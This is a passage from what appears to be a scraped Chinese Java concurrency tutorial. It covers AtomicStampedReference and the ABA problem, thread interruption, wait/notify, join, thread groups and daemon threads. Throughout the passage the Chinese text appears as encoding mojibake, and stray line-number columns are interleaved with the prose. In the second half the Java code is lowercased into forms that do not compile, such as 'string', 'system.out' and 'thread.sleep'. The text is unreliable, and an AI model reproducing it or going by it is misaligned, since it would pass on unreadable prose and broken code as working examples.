clientAccount.getAmount());\n                }\n            }\n        }).start();\n    }\n}\nè¾åºç»æï¼\nåå¼åæ¥è¯¢è¶è¿æ 10\nåå¼åæ¥è¯¢è¶è¿æ 10\nåå¼åæ¥è¯¢è¶è¿æ 10\nä½é¢å°äº20åï¼åå¼æåï¼ä½é¢ï¼30\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\nââ ä»¥ä¸åå­å¯ä»¥çå°ï¼å¤çº¿ç¨é´æä½åä¸ä¸ªå®ä¾å¯¹è±¡ï¼åªä¼æä¸ä¸ªæåãä½è¿ç§æ¨¡å¼å­å¨ä¸ä¸ª ABA é®é¢ï¼å°±æ¯ï¼å¨çº¿ç¨æä½åï¼è¿ä¸ªå¼å¾å¯è½è¢«å¶ä»çº¿ç¨ç¨å»åå¶ä»çï¼å¯¼è´å¼è¢«ä½¿ç¨ååæ¢åæ¥ï¼å½åçº¿ç¨ä¸æ¥çå¼æ²¡é®é¢ç»§ç»­ä½¿ç¨ï¼é ææ°æ®è¢«åç¨ï¼æä»¬è¿å»å»çä¸ç¥éï¼è¿ä¹æ¯å®å¨æ§é®é¢ãä½è¿ç§æåµå°±éè¦çæä»¬çä¸å¡æ¯å¦éè¦è§£å³ã\nââ è§£å³åæ³å¢å°±æ¯ä½¿ç¨ AtomicStampedReference å¸¦ææ¶é´æ³çå¯¹è±¡å¼ç¨ï¼ä¸å¶è¯´æ¶é´æ³ï¼æ´åæ¯ä¸ä¸ªä¿®æ¹æ è®°ï¼æ¯æ¬¡æ¶è´¹çæ¶åï¼æèåå¼çæ¶åæé½ç»ä¿®æ¹æ è®° + 1ï¼ä¸æ¦åæçåå§æ è®°ä¸ä¸æ ·ï¼æå°±ä¸è®©å¶ç»§ç»­åå¼ï¼åªè®©å¶æ¶è´¹ã\n\npublic static void main(String[] args) throws InterruptedException {\n    Account account = new Account();\n    account.setAmount(10);\n    AtomicStampedReference<Account> accountAtomicReference = new AtomicStampedReference<Account>(account,0);\n    // æ¨¡æåå¼\n    for(int i=0;i<3;i++){\n        int stamp = accountAtomicReference.getStamp();\n        new Thread(() -> {\n            while (true) {\n                Account clientAccount = accountAtomicReference.getReference();\n                System.out.println("åå¼åæ¥è¯¢ä½é¢è¿æ " + clientAccount.getAmount());\n                if (clientAccount.getAmount() < 20) {\n                    if (accountAtomicReference.compareAndSet(clientAccount, clientAccount.setAmount(clientAccount.getAmount() + 20),stamp,stamp+1)) {\n                        System.out.println("ä½é¢å°äº20åï¼åå¼æåï¼ä½é¢ï¼" + clientAccount.getAmount());\n                    }\n                }else {\n                    System.out.println("å½åç¨æ· åå¼è¿ä¸è½ååå¼");\n                    break;\n                }\n            }\n        }).start();\n    }\n    // æ¨¡ææ¶è´¹\n    for(int i=0;i<3;i++){\n        new Thread(() -> {\n            while (true) {\n                int stamp = accountAtomicReference.getStamp();\n                Account clientAccount = accountAtomicReference.getReference();\n                System.out.println("æ¶è´¹åæ¥è¯¢ä½é¢è¿æ " + clientAccount.getAmount());\n                if (clientAccount.getAmount() >= 10) {\n                    if (accountAtomicReference.compareAndSet(clientAccount, clientAccount.setAmount(clientAccount.getAmount() - 10),stamp,stamp+1)) {\n                        System.out.println("æåæ¶è´¹10åï¼ä½é¢è¿æï¼" + clientAccount.getAmount());\n                    }\n                }else{\n                    System.out.println("ä½é¢ä¸å¤");\n                    break;\n                }\n            }\n        }).start();\n    }\n}\nè¾åºç»æï¼\nåå¼åæ¥è¯¢ä½é¢è¿æ 10\nä½é¢å°äº20åï¼åå¼æåï¼ä½é¢ï¼30\nåå¼åæ¥è¯¢ä½é¢è¿æ 30\nå½åç¨æ· åå¼è¿ä¸è½ååå¼\næ¶è´¹åæ¥è¯¢ä½é¢è¿æ 30\næåæ¶è´¹10åï¼ä½é¢è¿æï¼20\næ¶è´¹åæ¥è¯¢ä½é¢è¿æ 20\næåæ¶è´¹10åï¼ä½é¢è¿æï¼10\næ¶è´¹åæ¥è¯¢ä½é¢è¿æ 10\næåæ¶è´¹10åï¼ä½é¢è¿æï¼0\næ¶è´¹åæ¥è¯¢ä½é¢è¿æ 0\nä½é¢ä¸å¤\næ¶è´¹åæ¥è¯¢ä½é¢è¿æ 0\nä½é¢ä¸å¤\nåå¼åæ¥è¯¢ä½é¢è¿æ 0\nåå¼åæ¥è¯¢ä½é¢è¿æ 20\nå½åç¨æ· åå¼è¿ä¸è½ååå¼\næ¶è´¹åæ¥è¯¢ä½é¢è¿æ 20\næåæ¶è´¹10åï¼ä½é¢è¿æï¼10\næ¶è´¹åæ¥è¯¢ä½é¢è¿æ 10\næåæ¶è´¹10åï¼ä½é¢è¿æï¼0\næ¶è´¹åæ¥è¯¢ä½é¢è¿æ 0\nä½é¢ä¸å¤\nåå¼åæ¥è¯¢ä½é¢è¿æ 10\nåå¼åæ¥è¯¢ä½é¢è¿æ 20\nå½åç¨æ· åå¼è¿ä¸è½ååå¼\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n\n\nââ å¦æè¯´å¨åå¼çæ¶åå ä¸ä¸ªæ¡ä»¶ï¼è®©å¶åªè½åå¼ 1 æ¬¡ï¼å¦ææä»¬ç¨ AtomicReference æ¯å®å¨åä¸å°çï¼å ä¸ºä»ä¸ä¼è®°å½ï¼éè¦æä»¬èªå·±å»æ·»å ä¸ä¸ªå¨å±åéå»ç»´æ¤ï¼ä½ä½¿ç¨ AtomicStampedReference å°±å¯ä»¥åå°ï¼å ä¸ºå®æ¬èº«å°±ç»´æ¤äºä¸ä¸ªæ è®°ï¼èä¸è¿å¸®æä»¬è§£å³äº ABA é®é¢ï¼å¦æè¯´å¼è¢«å¶ä»çº¿ç¨åç¨ï¼æ è®°å°±ä¼ + 1ï¼ä½¿å¾åå½åçº¿ç¨çæ è®°ä¸ä¸æ ·ï¼åä¿çå¼éåºã\n\nââ åºäº AtomicInteger å AtomicReference è¿æ AtomicReferenceArray AtomicIntegerArray ç­ï¼å·ä½ç API é½æ¯å·®ä¸å¤çã',normalizedContent:'# ä¸ãåºç¡æå¿µ\n\nå¨äºè§£éä¹åï¼æå¾å¤çåºç¡æå¿µéè¦åçè§£ä»¥ä¸ï¼æ¹ä¾¿ä»¥åæä»¬å¯¹åç§æåµçéçé®é¢ï¼ææ´å¥½çè®¤è¯ã\n\n\n# åæ­¥ å å¼æ­¥\n\nââ åæ­¥å°±æ¯å¤ä¸ªä»»å¡ä¸ä¸ªä¸ä¸ªæ§è¡ï¼å³ä½ å¨å­¦ä¹ çæ¶åä¸å¯è½ä¼ææ¸¸æï¼ææ¸¸æçæ¶åä¸å¯è½å¨å­¦ä¹ ã\nââ å¼æ­¥å°±æ¯ææ´è¡£æå¯ä»¥ç¨æ´è¡£æºæ´ï¼è¾¹æ´è¾¹æçµè¯ï¼èä¸æçµè¯çåæ¶è¿æ¯è½å¨åå¶ä»çäºæï¼è¿ä¸ªå°±æ¯å¼æ­¥æ§è¡ï¼ä½å¼æ­¥æ§è¡æ¯ä¸ç§ï¼å³åå³å®ç\n\n\n# å¹¶å å å¹¶è¡\n\nââ å¹¶è¡ å å¼æ­¥çä¼¼å¾åï¼ä½æå¿µæ¯å®å¨ä¸ä¸æ ·çãå¦æä¸è¿°è¯´å¼æ­¥æ¯ä¸ä¸ªäººå¯ä»¥åå¾å¤äºæï¼é£å¹¶è¡å¯ä»¥è¯´å¤ä¸ªäººåä¸åçäºæï¼å³å¤ä¸ª cpu å¤çä¸åçæä»¤æè½å«åå¹¶è¡ï¼ä¸ä¸ª cpu å¤çå¤çº¿ç¨å¹¶ä¸è½ç§°ä¹ä¸ºå¹¶è¡ï¼èæ¯å¹¶åã\n\n\n# ä¸´çåº\n\nââ ä¸´çåºç¨æ¥è¡¨ç¤ºä¸ç§å¬å±èµæºæå±äº«æ°æ®ï¼å¯ä»¥è¢«å¤ä¸ªçº¿ç¨ä½¿ç¨ãä½æ¯æ¯ä¸æ¬¡åªè½æä¸ä¸ªçº¿ç¨ä½¿ç¨å®ï¼ä¸æ¦ä¸´çåºèµæºè¢«å ç¨ï¼å¶ä»çº¿ç¨è¦æ³ä½¿ç¨è¿ä¸ªèµæºï¼å°±å¿é¡»ç­å¾ã\nââ å¨å¹¶è¡ç¨åºä¸­ï¼ä¸´çåºèµæºæ¯è¦è¢«ä¿æ¤çå¯¹è±¡ï¼å¦æèµæºåæ¶è¢«ä¸¤ä¸ªçº¿ç¨æä½ï¼åä¼å¾å°ç ´åã\n\n\n# é»å¡ å éé»å¡\n\nââ é»å¡æ¯å½ä¸´çèµæºè¢«æ¢å ï¼å¶ä»çº¿ç¨åéè¦å¨å¤ç­å¾èµæºéæ¾ï¼è¿ç§ç­å¾çè¿ç¨ç§°ä¸ºé»å¡ã\nââ éé»å¡æ¯ä¸ä¼åå ä¸ºèµæºè¢«æ¢å ï¼èä¸å»åå¶ä»äºæã\n\n\n# æ­»é é¥¥é¥¿ æ´»é\n\nââ æ­»éãé¥¥é¥¿ãæ´»éé½å±äºå¤çº¿ç¨æ´»è·æ§é®é¢ã\nââ æ­»éæ¯ä¸ä¸ªä¸¥éçç¨åºä¸è®¾è®¡åºç°çé®é¢ï¼å½ä¸ä¸ªèµæºè¢«å ç¨ï¼å ç¨åºçæå¤é®é¢ï¼å¯¼è´èµæºæ æ³è¢«éæ¾ï¼åå¶ä»çº¿ç¨å°±ä¸ç´ç­å¾é æçæåµè¢«ç§°ä¸ºæ­»éã\nââ é¥¥é¥¿æ¯ææä¸ä¸ªæèå¤ä¸ªçº¿ç¨å ä¸ºç§ç§åå æ æ³è·å¾æéçèµæºï¼å¯¼è´ä¸ç´æ æ³æ§è¡ãæ¯å¦ä»çä¼åçº§å¯è½å¤ªä½ï¼èé«ä¼åçº§ççº¿ç¨ä¸æ­æ¢å å®éè¦çèµæºï¼å¯¼è´åºä¼åçº§çº¿ç¨æ æ³å·¥ä½ã\nââ æ´»éæ¯å¤ä¸ªçº¿ç¨ä¹é´äºç¸è°¦è®©èå¯¼è´çï¼ä½ è®©ææè®©ä½ ï¼æèè¯´ä»ä»¬çº§å«ä¸æ ·å¯¼è´ã\n\n\n# å¹¶åççº§å«\n\nââ ç±äºä¸´çåºçå­å¨ï¼å¤çº¿ç¨ä¹é´çå¹¶åå¿é¡»åå°æ§å¶ãæ ¹æ®æ§å¶å¹¶åçç­ç¥ï¼æä»¬å¯ä»¥æå¹¶åççº§å«è¿è¡åç±»ï¼å¤§è´å¯ä»¥åä¸ºé»å¡ãæ é¥¥é¥¿ãæ éç¢ãæ éãæ ç­å¾å ç§ã\n\n\n# æ é¥¥é¥¿\n\nââ é¥¥é¥¿çäº§çæ¯å ä¸ºåºä¼åçº§å¨ä¸´çåºè¢«é«ä¼åçº§ççº¿ç¨æéèå¯¼è´ä¸ç´æ æ³è·åèµæº (ä¹å¯ä»¥ç§°æªéå¬å¹³é)ï¼è§£å³é¥¥é¥¿å°±æ¯è®©éåå¾å¬å¹³ï¼è¦æ³è·å¾èµæºï¼å°±å¿é¡»ä¹ä¹æéï¼ç®¡ä½ ä¼åçº§é«ä½ï¼åå°åå¾ã\n\n\n# æ éç¢\n\nââ æ éç¢æ¯ä¸ç§æå¼±çéé»å¡è°åº¦ãä¸¤ä¸ªçº¿ç¨å¦ææ¯æ éç¢çæ§è¡ï¼é£ä¹ä»ä»¬ä¸ä¼å ä¸ºä¸´çåºçé®é¢å¯¼è´ä¸æ¹è¢«æèµ·ãä¹å°±æ¯è¯´å¤§å®¶é½å¯ä»¥å¤§æå¤§æçè¿å¥ä¸´çåºï¼é£ä¹å¦æä¸èµ·ä¿®æ¹å±äº«æ°æ®ï¼ææ°æ®ä¿®æ¹åäºæä¹åï¼å¯¹äºæ éç¢ççº¿ç¨æ¥è¯´ï¼ä¸æ¦æ£æµå°è¿ç§æåµï¼å®å°±ä¼ç«å³å¯¹èªå·±æä½ççä¿®æ¹è¿è¡åæ»ï¼ç¡®ä¿æ°æ®å®å¨ãä½å¦ææ²¡ææ°æ®ç«äºåçï¼é£ä¹çº¿ç¨å°±å¯ä»¥é¡ºå©å®æèªå·±çå·¥ä½ï¼èµ°åºä¸´çåºã\nââ å¦æè¯´é»å¡çæ§å¶æ¹å¼æ¯æ²è§ç­ç¥ãä¹å°±æ¯è¯´ï¼ç³»ç»è®¤ä¸ºä¸¤ä¸ªçº¿ç¨ä¹é´å¾æå¯è½åçä¸å¹¸çå²çªï¼å æ­¤ï¼ä»¥ä¿æ¤å±äº«æ°æ®ä¸ºç¬¬ä¸ä¼åçº§ãç¸å¯¹æ¥è¯´ï¼éé»å¡çè°åº¦å°±æ¯ä¸ç§ä¹è§çç­ç¥ãå®è®¤ä¸ºå¤ä¸ªçº¿ç¨ä¹é´å¾æå¯è½ä¸ä¼åçå²çªï¼æèè¯´æ¦çä¸å¤§ï¼å æ­¤å¤§å®¶é½åºè¯¥æ éç¢çæ§è¡ï¼ä½æ¯ä¸æ¦æ£æµå°å²çªï¼å°±åºè¯¥åæ»ã\nââ ä»è¿ä¸ªç­ç¥ä¸­å¯ä»¥çå°ï¼æ éç¢çå¤çº¿ç¨ç¨åºä¸ä¸å®è½é¡ºççè¿è¡ãå ä¸ºå½ä¸´çåºä¸­å­å¨ä¸¥éçå²çªæ¶ï¼ææççº¿ç¨é½å¯è½ä¸æ­çåæ»èªå·±çæä½ï¼èæ²¡æä¸ä¸ªçº¿ç¨å¯ä»¥èµ°åºä¸´çåºï¼è¿ç§æåµä¼å½±åç³»ç»çæ­£å¸¸æ§è¡ãæä»¥ï¼æä»¬å¯è½ä¼éå¸¸å¸æå¨è¿ä¸å çº¿ç¨ä¸­ï¼è³å°å¯ä»¥æä¸ä¸ªçº¿ç¨å¨æéçæ¶é´åå®æèªå·±çæä½ï¼èéåºä¸´çåºãè¿æ ·è³å°å¯ä»¥ä¿è¯ç³»ç»ä¸ä¼åä¸´çåºä¸­æ éçç­å¾ã\nââ ä¸ç§å¯è¡çæ éç¢å®ç°å¯ä»¥ä¾èµä¸ä¸ª âä¸è´æ§æ è®°â æ¥å®ç°ãçº¿ç¨å¨æä½ä¹åï¼åè¯»åå¹¶ä¿å­è¿ä¸ªæ è®°ï¼å¨æä½å®æåï¼åæ¬¡è¯»åï¼æ£æ¥è¿ä¸ªæ è®°æ¯å¦è¢«æ´æ¹è¿ï¼å¦æè¯´ä¸¤èæ¯ä¸è´çï¼åè¯´æèµæºåºæ²¡æå²çªãå¦æä¸ä¸è´ï¼åè¯´æèµæºå¯è½å¨æä½è¿ç¨ä¸­ä¸å¶ä»åçº¿ç¨å²çªï¼éè¦éè¯æä½ãèä»»ä½å¯¹èµæºæä¿®æ¹æä½ççº¿ç¨ï¼å¨ä¿®æ¹æ°æ®åï¼é½éè¦æ´æ°è¿ä¸ªä¸è´æ§æ è®°ï¼è¡¨ç¤ºæ°æ®ä¸åå®å¨ã\n\n\n# æ é\n\nââ æ éçå¹¶è¡é½æ¯æ éç¢çãå¨æ éçæåµä¸ï¼ææççº¿ç¨é½è½å°è¯å¯¹ä¸´çåºè¿è¡è®¿é®ï¼ä½ä¸åçæ¯ï¼æ éçå¹¶åä¿è¯å¿ç¶æä¸ä¸ªçº¿ç¨è½å¤å¨æéæ¶é´åå®ææä½ç¦»å¼ä¸´çåºã\nââ å¨æ éçè°ç¨ä¸­ï¼ä¸ä¸ªå¸åçç¹ç¹æ¯å¯è½ä¼åå«ä¸ä¸ªå»ç©·å¾ªç¯ãå¨è¿ä¸ªå¾ªç¯ä¸­ï¼çº¿ç¨ä¼ä¸æ­å°è¯ä¿®æ¹å±äº«åéãå¦ææ²¡æå²çªï¼ä¿®æ¹æåï¼ç¨åºéåº ï¼å¦åç»§ç»­å°è¯ä¿®æ¹ãä½æ è®ºå¦ä½ï¼æ éçå¹¶è¡æ»è½ä¿è¯æä¸ä¸ªçº¿ç¨å¯ä»¥èåºçï¼ä¸è³äºå¨åè¦æ²¡ãè³äºä¸´çåºä¸­ç«äºå¤±è´¥ççº¿ç¨ï¼ä»ä»¬åå¿é¡»ä¸æ­éè¯ï¼ç´å°èªå·±èå©ãå¦æè¿æ°ä¸å¥½ï¼æ»æ¯å°è¯ä¸æåï¼åä¼åºç±»ä¼¼é¥¥é¥¿çç°è±¡ï¼çº¿ç¨ä¼åæ­¢ä¸åã\n\n\n# æ ç­å¾\n\nââ æ éåªè¦æ±æä¸ä¸ªçº¿ç¨å¯ä»¥å¨æéæ­¥åå®ææä½ï¼èæ ç­å¾åå¨æ éçåºç¡ä¸æ´è¿ä¸æ­¥è¿è¡æ©å±ãå®è¦æ±ææççº¿ç¨é½å¿é¡»å¨æéæ­¥åå®æï¼è¿æ ·å°±ä¸ä¼å¼èµ·é¥¥é¥¿é®é¢ãå¦æåè¿è¡ä¼åï¼è¿å¯ä»¥è¿ä¸æ­¥åè§£ä¸ºæéæ ç­å¾åçº¿ç¨æ°æ å³çæ ç­å¾å ç§ï¼ä»ä»¬ä¹åçåºå«åªæ¯å¯¹å¾ªç¯æ¬¡æ°çéå¶ä¸åã\nââ ä¸ç§å¸åçæ ç­å¾ç»æå°±æ¯ rcu (read-copy-update)ãå®çåºæ¬ææ³æ¯ï¼å¯¹æ°æ®çè¯»å¯ä»¥ä¸å æ§å¶ãå æ­¤ææçè¯»çº¿ç¨é½æ¯æ ç­å¾çï¼å®ä»¬æ¢ä¸ä¼è¢«éå®ç­å¾ä¹ä¸ä¼å¼èµ·ä»»ä½å²çªãä½å¨åæ°æ®çæ¶åï¼ååå¾åå§æ°æ®çå¯æ¬ï¼æ¥çåªä¿®æ¹å¯æ¬æ°æ®ï¼ä¿®æ¹å®æåï¼å¨åéçæ¶æºååæ°æ®ã\n\n\n# åå­æ§\n\nââ æ¯æä¸ä¸ªæä½æ¯ä¸å¯è¢«ä¸­æ­çï¼å³ä½¿å¤ä¸ªçº¿ç¨ä¸èµ·æ§è¡çæ¶åï¼ä¸ä¸ªæä½ä¸æ¦å¼å§ï¼å°±ä¸ä¼è¢«å¶ä»çº¿ç¨å¹²æ°ã\n\n\n# å¯è§æ§\n\nââ æå½ä¸ä¸ªçº¿ç¨ä¿®æ¹äºå±äº«åéçå¼ï¼å¶ä»çº¿ç¨æ¯å¦è½å¤ç«å³ç¥éè¿ä¸ªä¿®æ¹ã\n\n\n# æåºæ§\n\nââ æåºæ§çé®é¢æ¯å ä¸ºå¨ç¨åºæ§è¡æ¶ï¼å¯è½ä¼è¿è¡æä»¤çéæï¼éæåçæä»¤ä¸åæä»¤çé¡ºåºæªå¿ä¸è´ã(è¿ç§æåµä¼åºç°å¨å¹¶åç¨åºè®¾è®¡ä¸­)\n\n\n# äºãçº¿ç¨\n\n\n# ç¶æ\n\nnew æ°å»ºï¼\nrunnable å¯è¿è¡ç¶æï¼\nblocked é»å¡ (éå° synchronizedï¼ç´å°è·å¾é)ï¼\nwaiting æ æ¶é´çç­å¾ (wait (),notify ())ï¼\ntimed_waiting ææ¶é´çç­å¾ï¼\nterminated ç»æã\n\n\n# suspend () æå resume () ç»§ç»­\n\nââ å­é¢ææï¼ä½ suspend () ä¸ä¼éæ¾éï¼å¿é¡»è°ç¨ resume () æè½éæ¾éï¼ä½æ¯å¦ææå¤ç resume () æ¯ suspend () æåæ§è¡ï¼åå¶ä»çº¿ç¨æ°¸è¿ç­å¾ï¼åä¸ºæ­»éã\n\n\n# stop () å¼ºè¡ç»æ­¢çº¿ç¨\n\nââ thread.stop (); å¼ºè¡ç»æ­¢çº¿ç¨ï¼ä¼å¯¼è´æ°æ®ä¸ä¸è´ï¼ç ´åæ°æ®ã\n\n\n# interrupt () isinterrupted () interrupted () ä¸­æ­çº¿ç¨\n\nââ thread.interrupt () ä¸­æ­çº¿ç¨ï¼ä¹å°±æ¯è®¾ç½®ä¸­æ­æ å¿ä½ãthread.isinterrupted () å¤æ­å½åçº¿ç¨æ¯å¦è¢«ä¸­æ­ã thread.interrupted () ä¹æ¯ç¨æ¥å¤æ­å½åçº¿ç¨çä¸­æ­ç¶æãå¦æå¨çº¿ç¨ä¸­ä½¿ç¨äº thread.sleep ()ï¼é£ä¹è¦ä¸­æ­ä¸ä¸ªçº¿ç¨å¿é¡»ä¹å¨ thread.sleep () ç catch è¯­å¥ä¸­ å¨æ§è¡ä¸æ¬¡å½åçº¿ç¨çä¸­æ­ã\n\n> thread.sleep () æ¹æ³ç±äºä¸­æ­èæåºå¼å¸¸ï¼æ­¤æ¶ï¼ä»ä¼æ¸é¤ä¸­æ­æ å¿ï¼å¦æä¸å å¤çï¼é£ä¹å¨ä¸æ¬¡æ§è¡çº¿ç¨æ¶ï¼å°±æ æ³å¤æ­è¿ä¸ªä¸­æ­æ å¿ï¼ä¼ç»§ç»­æ§è¡çº¿ç¨ï¼å¹¶ä¸ä¼è¾¾å°ä¸­æ­çº¿ç¨ã\n> ä¸­æ­æ¯ä¸ä¼éæ¾éçã\n\n    public static void main(string[] args) throws interruptedexception {\n        string a = "1";\n        thread[] threads = new thread[2];\n        for(int i=0;i<2;i++){\n            int b = i;\n            threads[i] = new thread(() -> {\n                while (true) {\n                    synchronized (a) {\n                        try {\n                            system.out.println("çº¿ç¨å¯å¨ " + b);\n                            if (thread.currentthread().isinterrupted()) {\n                                system.out.println("çº¿ç¨ä¸­æ­" + b);\n                                break;\n                            }\n                            thread.sleep(5000);\n                            system.out.println("æ§è¡å®æ¯ " + b);\n                        } catch (interruptedexception e) {\n                            system.out.println("èå­è¢«ä¸­æ­äº " + b);\n                            // è¿éå¿é¡»å¨ä¸­æ­ä¸æ¬¡ï¼å¦å\n                            thread.currentthread().interrupt();\n                        }\n                    }\n                }\n            });\n        }\n        threads[0].start();\n        thread.sleep(2000);\n        threads[0].interrupt();\n        threads[1].start();\n    }\nè¾åºç»æï¼\nçº¿ç¨å¯å¨ 0\nèå­è¢«ä¸­æ­äº 0\nçº¿ç¨å¯å¨ 0\nçº¿ç¨ä¸­æ­0\nçº¿ç¨å¯å¨ 1\næ§è¡å®æ¯ 1\nçº¿ç¨å¯å¨ 1\næ§è¡å®æ¯ 1\nçº¿ç¨å¯å¨ 1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n\n# wait () notify () notifyall () ç­å¾åå¤é\n\nââ å¦æä¸ä¸ªçº¿ç¨è°ç¨äº object.wait ()ï¼é£ä¹å®å°±ä¼è¿å¥ object å¯¹è±¡çç­å¾éåï¼è¿ä¸ªç­å¾éåä¸­å¯è½ä¼æå¤ä¸ªçº¿ç¨ï¼å ä¸ºç³»ç»è¿è¡å¤ä¸ªçº¿ç¨åæ¶ç­å¾æä¸ä¸ªå¯¹è±¡ãå½ object.notify () è¢«è°ç¨æ¶ï¼å®å°±ä¼ä»è¿ä¸ªç­å¾éåä¸­ï¼éæºéæ©ä¸ä¸ªçº¿ç¨ï¼å¹¶å°å¶å¤éãéè¦å¤§å®¶æ³¨æçæ¯è¿ä¸ªéæ©æ¯ä¸å¬å¹³çï¼å¹¶ä¸æ¯åç­å¾ççº¿ç¨ä¼ä¼åè¢«éæ©ï¼è¿ä¸ªéæ©å®å¨æ¯éæºçãobject.notifyall () å®å notify () çåè½åºæ¬ä¸è´ï¼ä½ä¸åçæ¯ï¼å®ä¼å¤éå¨è¿ä¸ªç­å¾éåä¸­ææç­å¾ççº¿ç¨ï¼èä¸æ¯éæºéæ©ä¸ä¸ªã\nââ object.wait () å object.notify () å¿é¡»å¨å¯¹åºç synchronized è¯­å¥ä¸­ï¼éè¦é¦åè·å¾ç®æ å¯¹è±¡çä¸ä¸ªçè§å¨ã\n\n> wait () æ¹æ³åªä¼éæ¾å½åå¯¹è±¡çéï¼ä¸ä¼éæ¾ææéã\n> notify () ä¸ä¼ç«å»ç«å»éæ¾ sycronizedï¼objï¼ä¸­ç obj éï¼å¿é¡»è¦ç­ notify () æå¨çº¿ç¨æ§è¡å®å®¹ synchronizedï¼objï¼åä¸­çææä»£ç æä¼éæ¾è¿æéã\n\n\n# join () ç­å¾çº¿ç¨ç»æï¼yield () è°¦è®©\n\n    public volatile static int i = 0;\n\n    public static void main(string[] args) throws interruptedexception {\n        thread thread = new thread(() -> {\n            for(i=0;i<100000;i++);\n        });\n        thread.start();\n        thread.join();\n        system.out.println(i);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n\n\n\nââ join () ä¼ä¸ç´é»å¡çº¿ç¨ç´å°ç®æ çº¿ç¨æ§è¡å®æ¯ãå¦æä¸ä½¿ç¨ join () ç­å¾ threadï¼é£ä¹å¾å°ç i å¾å¯è½æ¯ 0 æèä¸ä¸ªéå¸¸å°çæ°å­ãå ä¸º thread è¿æ²¡å¼å§æ§è¡ï¼i çå¼å°±å·²ç»è¢«è¾åºäºã\nââ yield () ä¼ä½¿å½åçº¿ç¨è®©åº cpuãä½è®©åº cpu å¹¶ä¸ä»£è¡¨å½åçº¿ç¨ä¸æ§è¡äºãå½åçº¿ç¨è®©åº cpu åï¼ä¼è¿è¡ cpu èµæºçäºå¤ºï¼ä½æ¯å¦è½å¤åæ¬¡è¢«åéï¼å°±ä¸ä¸å®äºãå¦æä½ è§å¾ä¸ä¸ªçº¿ç¨ä¸é£ä¹éè¦ï¼æèä¼åçº§éå¸¸ä½ï¼èä¸åå®³æå®ä¼å ç¨å¤ªå¤ç cpu èµæºï¼é£ä¹å¯ä»¥å¨éå½çæ¶åè°ç¨ yield () ï¼ç»äºå¶ä»éè¦çº¿ç¨æ´å¤çå·¥ä½æºä¼ã\n\n> yield ä¸ä¼éæ¾éï¼éæ§è¡å®æ¯\n\n\n# threadgroup çº¿ç¨ç»\n\n    public static void main(string[] args) throws interruptedexception {\n        threadgroup threadgroup = new threadgroup("è®¢åç»");\n        thread t1 = new thread(threadgroup,() -> {\n            string name = thread.currentthread().getname();\n            try {\n                thread.sleep(5000);\n            } catch (interruptedexception e) {\n                e.printstacktrace();\n            }\n            system.out.println("å½åçº¿ç¨åç§° :" + name);\n        },"ä¸å");\n        thread t2 = new thread(threadgroup,() -> {\n            string name = thread.currentthread().getname();\n            try {\n                thread.sleep(5000);\n            } catch (interruptedexception e) {\n                e.printstacktrace();\n            }\n            system.out.println("å½åçº¿ç¨åç§° :" + name);\n        },"åæ¶è®¢å");\n        t1.start();\n        t2.start();\n        system.out.println(threadgroup.activecount());\n        threadgroup.list();\n    }\n\nç»æï¼\n2\njava.lang.threadgroup[name=è®¢åç»,maxpri=10]\n    thread[ä¸å,5,è®¢åç»]\n    thread[åæ¶è®¢å,5,è®¢åç»]\nå½åçº¿ç¨åç§° :åæ¶è®¢å\nå½åçº¿ç¨åç§° :ä¸å\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n\n# setdaemon () å®æ¤çº¿ç¨\n\nââ å®æ¤çº¿ç¨æ¯ä¸ç§ç¹æ®ççº¿ç¨ï¼å°±åä»çåå­ä¸æ ·ï¼å®æ¯ç³»ç»çå®æ¤èï¼å¨åå°é»é»çå®æä¸äºç³»ç»çä»»å¡ï¼æ¯å¦åå¾åæ¶çº¿ç¨ãjit çº¿ç¨å°±å¯ä»¥çè§£ä¸ºå®æ¤çº¿ç¨ãä¸ä¹ç¸å¯¹åºçæ¯ç¨æ·çº¿ç¨ï¼ç¨æ·çº¿ç¨å¯ä»¥è®¤ä¸ºæ¯ç³»ç»çå·¥ä½çº¿ç¨ï¼å®ä¼å®æè¿ä¸ªç¨åºåºè¯¥è¦å®æçä¸å¡æä½ãå¦æç¨æ·çº¿ç¨å¨é¨ç»æï¼è¿ä¹æå³çè¿ä¸ªç¨åºå®éä¸æ äºå¯åãå®æ¤çº¿ç¨è¦å®æ¤çå¯¹è±¡å·²ç»ä¸å­å¨äºï¼é£ä¹æ´ä¸ªåºç¨ç¨åºå°±èªç¶åºè¯¥ç»æãå æ­¤ï¼å½ä¸ä¸ª java åºç¨åï¼åªæå®æ¤çº¿ç¨æ¶ï¼java èææºå°±ä¼èªç¶éåºã\n\n        t1.setdaemon(true);\n        t2.setdaemon(true);\n        t1.start();\n        t2.start();\n\n\n1\n2\n3\n4\n\n\nââ è®¾ç½®å®æ¤çº¿ç¨å¿é¡»å¨ start () ä¹åè®¾ç½®ãå¦æä¸è¿°ä¾å­ä¸¤ä¸ªé½æ¯å®æ¤çº¿ç¨ï¼åä¸ä¼ç­å°çº¿ç¨éæå°ç»æï¼ç¨åºç´æ¥ç»æãç¨æ·çº¿ç¨çè¯ï¼ä¼ç­å°çº¿ç¨ä»¥ä¸ä¸¤ä¸ªçº¿ç¨æ§è¡å®æï¼åä¸»çº¿ç¨ç»æã\n\n\n# setpriority () çº¿ç¨ä¼åçº§\n\nââ java ä¸­ï¼ä½¿ç¨ 1-10 è¡¨ç¤ºçº¿ç¨ä¼åçº§ï¼æ°å­è¶å¤§åè¶ä¼åã\n\n\n# ä¸ãvolatile\n\nâ â å½ä½ ç¨ volatile 